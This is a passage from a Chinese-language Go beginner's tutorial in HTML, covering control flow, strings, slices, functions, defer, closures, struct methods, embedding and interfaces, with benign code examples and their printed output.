class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> a == <span class="hljs-number">10</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a==10&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;a=&quot;</span>, a)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>switch</code></p><p>默认op为<code>true</code></p><p><code>go</code>的<code>op</code>可以是任何数据类型</p><p><code>switch</code>没有穿透性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> a &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;default&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>fallthrough</code>可以提供穿透性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;case else&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>配合使用<code>break</code>可以跳出穿透</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">str := <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>fmt.Println(<span class="hljs-string">&quot;case 1&quot;</span>)<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br><span class="hljs-keyword">if</span> str == <span class="hljs-string">&quot;1&quot;</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;case 2&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;case else&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>加强的<code>swith</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> a &lt;= <span class="hljs-number">2</span>:<br>fmt.Println(<span class="hljs-string">&quot;a&lt;=2&quot;</span>)<br><span class="hljs-keyword">case</span> a &lt; <span class="hljs-number">2</span> &amp;&amp; a &gt;= <span class="hljs-number">0</span>:<br>fmt.Println(<span class="hljs-string">&quot;a&lt;2&amp;&amp;a&gt;=0&quot;</span>)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;default&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>死循环</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>加强的<code>for</code>(遍历是数组和切片)</p><p>注意<code>range</code>会返回两个值，第一个是下标，第二个是<code>value</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++ &#123;<br>str += <span class="hljs-type">string</span>(<span class="hljs-string">&#x27;A&#x27;</span> + i)<br>&#125;<br>fmt.Println(str)<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> str &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d:%c  &quot;</span>, i, v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ol><li><p>求长度使用<code>len</code></p></li><li><p>和<code>java</code>一样<code>string</code>是不可以修改的</p></li><li><p>字符串其他操作</p><p>遍历查询string</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;awd&quot;</span><br>fmt.Println(<span class="hljs-built_in">len</span>(str))<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(str); i++ &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%c&quot;</span>, str[i])<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure></li><li><p>数组</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br><span class="hljs-keyword">for</span> i, v := <span class="hljs-keyword">range</span> a &#123;<br>fmt.Println(i, v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组可以直接打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<span class="hljs-comment">//这是一个切片，没有固定的大小，像vector</span><br>    ints2 := [<span class="hljs-number">12</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>&#125;<span class="hljs-comment">//这是一个数组</span><br><br>log.Println(ints)<br>&#125;<br></code></pre></td></tr></table></figure><p>打印结果</p><p><code>[1 2 3 4 5]</code></p></li><li><p>字符串</p><ol><li><p>字符串的创建和转换</p><ul><li><code>str := &quot;hello&quot;</code>：使用双引号或反引号创建字符串。</li><li><code>str := string([]byte&#123;&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;&#125;)</code>：将字符切片转换为字符串。</li><li><code>str := strconv.Itoa(123)</code>：将整数转换为字符串。</li></ul></li><li><p>字符串的长度和索引</p><ul><li><code>len(str)</code>：获取字符串的长度（单位为字节）。</li><li><code>str[index]</code>：获取指定索引位置的字符。</li></ul></li><li><p>字符串的拼接和分割</p><ul><li><code>str := str1 + str2</code>：将两个字符串拼接起来。</li><li><code>strings.Join(strs []string, sep string) string</code>：将多个字符串拼接成一个字符串，中间用 <code>sep</code> 分隔。</li><li><code>strings.Split(str string, sep string) []string</code>：将字符串按照 <code>sep</code> 分割成多个子串，返回一个字符串切片。</li></ul></li><li><p>字符串的查找、比较和替换</p><ul><li><code>strings.Contains(str string, substr string) bool</code>：判断字符串 <code>str</code> 是否包含子串 <code>substr</code>。</li><li><code>strings.Index(str string, substr string) int</code>：返回子串 <code>substr</code> 在字符串 <code>str</code> 中第一次出现的位置，若不存在则返回 <code>-1</code>。</li><li><code>strings.Replace(str string, old string, new string, n int) string</code>：将字符串中的 <code>old</code> 替换为 <code>new</code>，如果指定了 <code>n</code>，则最多替换 <code>n</code> 次。</li></ul></li><li><p>字符串的转换和格式化</p><ul><li><code>strconv.Atoi(str string) (int, error)</code>：将字符串转换为整数。</li><li><code>strconv.ParseFloat(str string, bitSize int) (float64, error)</code>：将字符串转换为浮点数。</li><li><code>fmt.Sprintf(format string, a ...interface&#123;&#125;) string</code>：类似于 <code>Printf</code>，但是返回一个字符串，而不是将结果输出到标准输出。</li></ul></li></ol></li></ol><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p><img src="https://go-1317182407.cos.ap-nanjing.myqcloud.com/%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/%E9%83%A8%E5%88%86%E5%88%AB%E5%90%8D.png"></p><ol><li><p>一个加法函数</p><p>多注意参数列表的省略</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> a + b<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>一个传址的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add2</span><span class="hljs-params">(a, b *<span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> *a + *b<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>形式参数，和实际参数</p><p>形式参数：函数的参数列表</p><p>实际参数：调用函数时传的参数</p></li><li><p>可变参数列表</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add3</span><span class="hljs-params">(args ...<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>SUM := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> args &#123;<br>SUM += v<br>&#125;<br><span class="hljs-keyword">return</span> SUM<br>&#125;<br>  <br></code></pre></td></tr></table></figure><ul><li><p>可以使用len()计算可变参数长度</p></li><li><p>每一个函数只能写一个一个可变参数</p></li><li><p><code>any</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> ANY any<br></code></pre></td></tr></table></figure></li></ul></li><li><p>参数的传递</p><ul><li><p>值传递</p><p>基础数据类型，array，struct</p><p>注意使用传递数组的时候，我们需要将形参的数组的的的大小和实参数组的大小同一</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints [3]<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(ints)<br>ints[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span><br>fmt.Println(ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">//这是一个数组</span><br>fmt.Println(ints2)<br>test(ints2)<br>fmt.Println(ints2)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果：</p><blockquote><p>[1 2 3]<br>[1 2 3]<br>[100 2 3]<br>[1 2 3]</p></blockquote><p>可见没被更改</p></li><li><p>引用传递</p><p>切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints []<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(ints)<br>ints[<span class="hljs-number">0</span>] = <span class="hljs-number">100</span><br>fmt.Println(ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; <span class="hljs-comment">//这是一个数组</span><br>fmt.Println(ints2)<br>test(ints2)<br>fmt.Println(ints2)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>[1 2 3]<br>[1 2 3]<br>[100 2 3]<br>[100 2 3]</p></blockquote></li><li><p>直接传地址</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(ints *<span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(*ints)<br>*ints = <span class="hljs-number">100</span><br>fmt.Println(*ints)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ints2 := <span class="hljs-number">2</span><br>fmt.Println(ints2)<br>test(&amp;ints2)<br>fmt.Println(ints2)<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>2<br>2<br>100<br>100</p></blockquote></li></ul></li></ol><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><ol><li>近者优先使用</li></ol><h3 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">workOut</span><span class="hljs-params">(num <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> num + workOut(num<span class="hljs-number">-1</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(workOut(<span class="hljs-number">100</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="推迟（延迟）函数"><a href="#推迟（延迟）函数" class="headerlink" title="推迟（延迟）函数"></a>推迟（延迟）函数</h3><ol><li><p><code>defer</code> 修饰调用函数</p><p>表示在最后调用</p></li><li><p>如果有多条<code>defer</code>则defer语句会逆序调用，也就是类型栈，先声明的最后调用</p></li><li><p>表面上是最后执行，其实是顺序编译，放进调用栈，在这个时候就已经传参。所以出现多个<code>defer</code>时出现先调用后执行</p></li></ol><h3 id="函数的数据类型"><a href="#函数的数据类型" class="headerlink" title="函数的数据类型"></a>函数的数据类型</h3><ol><li><p>函数本身也是一个数据了类型，类似C语言的函数指针</p><p><code>func main() </code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func() </p></blockquote><p><code>func test() int </code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func() int</p></blockquote><p><code>func(int, int) (int, int)</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>test(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果</p><blockquote><p>func(int, int) (int, int)</p></blockquote></li><li><p>类比函数指针</p></li></ol><h3 id="无名函数"><a href="#无名函数" class="headerlink" title="无名函数"></a>无名函数</h3><ol><li><p>通过函数类型进行函数赋值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> test2 <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)<br>test2 = test<br>test2(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%T&quot;</span>, test) <span class="hljs-comment">//打印函数的类型</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看成C语言的函数，或者c++的可调用对象</p></li><li><p>无名函数</p><p>相当于c++的lambda表达式</p><p>不写函数名，直接写<code>()</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(a, b <span class="hljs-type">int</span>)</span></span> &#123;<br>fmt.Println(a, b)<br>fmt.Printf(<span class="hljs-string">&quot;this is lambda&quot;</span>)<br>&#125;(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数也可以当作函数的参数，就是回调函数</p></li><li><p>函数作为另一个函数的<code>return </code>，可以形成闭包结构</p></li></ol><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>&#x2F;&#x2F;没学懂</p><h3 id="结构体函数"><a href="#结构体函数" class="headerlink" title="结构体函数"></a>结构体函数</h3><ul><li><p>在func后面添加结构体</p><p>参考代码实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>ids  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> getName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> s.name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Student)</span></span> getIds() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> s.ids<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="错误定义"><a href="#错误定义" class="headerlink" title="错误定义"></a>错误定义</h3><ol><li><p><code>import &quot;errors&quot;</code></p><p>errors.New(string)</p><p>返回错误的类型</p></li></ol><h3 id="获取时间"><a href="#获取时间" class="headerlink" title="获取时间"></a>获取时间</h3><ol><li><code>import &quot;time&quot;</code></li></ol><h3 id="数字的解析"><a href="#数字的解析" class="headerlink" title="数字的解析"></a>数字的解析</h3><ol><li><p><code>f, _ := strconv.ParseFloat(&quot;1.421&quot;, 64)</code></p></li><li><p><img src="C:\Users\12414\Desktop\hexo\source_posts\go\初始go.assets\image-20230512232257694.png"></p></li></ol><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><h4 id="继承-amp-重载"><a href="#继承-amp-重载" class="headerlink" title="继承&amp;重载"></a>继承&amp;重载</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-keyword">type</span> Father1 <span class="hljs-keyword">struct</span> &#123;<br>    money <span class="hljs-type">string</span><br>    name  <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Father1)</span></span> SetName(name <span class="hljs-type">string</span>) &#123;<br>    this.name = name<br>&#125;<br><br><span class="hljs-keyword">type</span> Father2 <span class="hljs-keyword">struct</span> &#123;<br>    age        <span class="hljs-type">int</span><br>    matherName <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">type</span> Son <span class="hljs-keyword">struct</span> &#123;<br>    Father1<br>    Father2<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(this *Son)</span></span> SetName(name <span class="hljs-type">string</span>) &#123;<br>    this.name = name<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    mySonZjy := Son&#123;<br>        Father1: Father1&#123;<span class="hljs-string">&quot;no money&quot;</span>, <span class="hljs-string">&quot;chg&quot;</span>&#125;,<br>        Father2: Father2&#123;<span class="hljs-number">19</span>, <span class="hljs-string">&quot; zjy&amp;chg&quot;</span>&#125;,<br>    &#125;<br>    fmt.Println(mySonZjy)<br><br>    mySonZjy.Father1.SetName(<span class="hljs-string">&quot;this father name&quot;</span>)<br>    fmt.Println(mySonZjy)<br>    mySonZjy.SetName(<span class="hljs-string">&quot;this is son name&quot;</span>)<br>    fmt.Println(mySonZjy)<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><ol><li><p>通过接口实现多态，也就是相当<code>c++</code>的纯虚基类</p></li><li><p>接口本质是一个指针</p></li><li><p>代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 多态的实现</span><br><span class="hljs-keyword">type</span> Animal <span 